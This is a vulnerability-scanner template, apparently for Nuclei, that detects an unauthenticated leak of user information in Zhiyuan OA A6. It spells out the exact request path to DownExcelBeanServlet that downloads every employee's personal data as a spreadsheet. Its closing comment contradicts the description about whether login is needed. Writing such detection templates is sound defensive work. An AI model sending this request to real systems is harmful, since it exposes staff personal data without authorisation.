id: zhiyuanOA-DownExcelBeanServlet-userinfo-leak

info:
  name: 致远OA A6 DownExcelBeanServlet 用户敏感信息泄露
  author: cnaq
  severity: medium  
  description: 致远OA A6 存在某个未授权的接口导致任意访问者可下载OA中的用户信息
  reference: 
    - http://wiki.peiqi.tech/wiki/oa/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20DownExcelBeanServlet%20%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.html
  tags: zhiyuanOA,userinfo,leak

requests:
  - method: GET
    path:
      - "{{BaseURL}}/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - '.xls'
          
# 需登录,任意用户访问，可下载所有员工的个人信息